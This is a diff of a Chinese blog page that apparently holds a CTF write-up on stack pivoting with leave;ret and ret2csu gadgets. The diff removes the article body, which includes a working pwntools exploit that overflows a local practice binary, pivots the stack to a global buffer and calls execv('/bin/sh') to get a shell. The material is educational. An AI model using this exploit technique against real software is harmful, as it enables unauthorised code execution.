@@ -177,15 +177,8 @@
       
         <h4 id="0-前言-amp-回顾"><a href="#0-前言-amp-回顾" class="headerlink" title="0.前言&amp;回顾"></a>0.前言&amp;回顾</h4><p>简单的栈转移，但是我不清楚为什么给的system我用不用了……（可能只是因为我菜），所以我用的还是execv。此题和之前ret2csu的有些类似，只是需要进行栈转移。</p>
 <p>我们知道，leave的实质是<strong>mov rsp,rbp;pop rbp</strong>。而ret的实质是<strong>pop rip</strong>。</p>
-<h4 id="1-栈转移的原因及方法"><a href="#1-栈转移的原因及方法" class="headerlink" title="1.栈转移的原因及方法"></a>1.栈转移的原因及方法</h4><h5 id="1-1-原因"><a href="#1-1-原因" class="headerlink" title="1-1.原因"></a>1-1.原因</h5><p>由于程序中存在栈溢出漏洞，但<strong>可以溢出的长度又受到限制，不足以让我们完成整个rop。</strong>这时候就需要把栈转移到<strong>长度足够的可以操作的段</strong>上。（例如.bss）把事先写好的rop注入到我们需要转移到段上，这样就可以继续达成我们的目的。</p>
-<h5 id="1-2-方法"><a href="#1-2-方法" class="headerlink" title="1-2.方法"></a>1-2.方法</h5><p>我们知道，栈是由rbp和rsp决定的，尤其是后者。可以说，rsp再哪，栈就在哪。因此，我们只需要想办法<strong>把rsp指针转移到我们需要的地方</strong>即可。而想要改变rsp的值，可以先通过改变rbp的值，再把rbp的值传递给rsp就可以达到栈转移到目的。<br>主要有两种方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rbp;ret+target stack addr+leave;ret</span><br><span class="line">target stack addr+leave;ret+leave;ret</span><br></pre></td></tr></table></figure>
-<h4 id="2-例子"><a href="#2-例子" class="headerlink" title="2.例子"></a>2.例子</h4><p>本题用到的ELF文件：<a href="advanced">点击下载</a><br><em>简单重复的略过。</em><br>IDA中可以观察到存在栈溢出漏洞，但read读取的字节不够我们完成rop，这时候需要进行栈溢出。<br><img src="/2021/10/11/%E6%B5%85%E8%B0%88%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E8%BD%AC%E7%A7%BB/1.png"><br>注意到<strong>global_buf</strong>这段缓冲区的长度足够。<br><img src="/2021/10/11/%E6%B5%85%E8%B0%88%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E8%BD%AC%E7%A7%BB/2.png"><br>因此我们的目标就是<strong>用我们需要的rop去填充这段缓冲区，再把栈转移到这段缓冲区上，</strong>程序就会执行我们事先写好的rop。<br>用ropper可以找到<strong>leave;ret</strong>这个gadget。如图：<br><img src="/2021/10/11/%E6%B5%85%E8%B0%88%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E8%BD%AC%E7%A7%BB/3.png"><br>程序中有 <strong>__libc_csu_init()</strong> 函数，如图。因此这里我采用的是<strong>通用gadget</strong>的方法。<em>（当然不止可以构建这一种rop就是）</em><br><img src="/2021/10/11/%E6%B5%85%E8%B0%88%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E8%BD%AC%E7%A7%BB/4.png"><br>在got段中可以找到execv的地址。</p>
-<p>思路拟好后，脚本就好写了。这里提供一种脚本写法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./advanced&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(<span class="number">0x404080</span>)+p64(<span class="number">0x4011fb</span>) <span class="comment">#栈转移到global_buf</span></span><br><span class="line">payload2=p64(<span class="number">0x40133a</span>) <span class="comment">#gadget1_addr</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x404080</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x403ff8</span>)</span><br><span class="line">payload2+=p64(<span class="number">0x401320</span>) <span class="comment">#gadget2_ddr</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;global:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+payload2)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input:&#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p><em>解释一下，因为本程序中不存在“/bin/sh”这个字符串，因此需要自己写入缓冲区中。又因为在执行leave时会有一个pop rbp的过程，因此先将“/bin/sh”读入缓冲区，这样它就会被pop进rbp中，此时rsp就会指向下一个区域。这样 <strong>既可以读入“/bin/sh”，还把这段字符串放在了栈之外，使之不会受到影响。</strong> <del>可谓是一举两得。</del></em></p>
-<p>运行该脚本即可取得shell。</p>
-
+<h4 id="1-栈转移的原因及方法"><a href="#1-栈转移的原因及方法" class="headerlink" title="1.栈转移的原因及方法"></a>1.栈转移的原因及方法</h4>
+        
       
 
       
@@ -1336,6 +1329,10 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">题目</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">解题思路</a>
               </li>
              
@@ -1349,10 +1346,6 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">测试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">题目</a>
               </li>
             
             <div class="clearfix"></div>
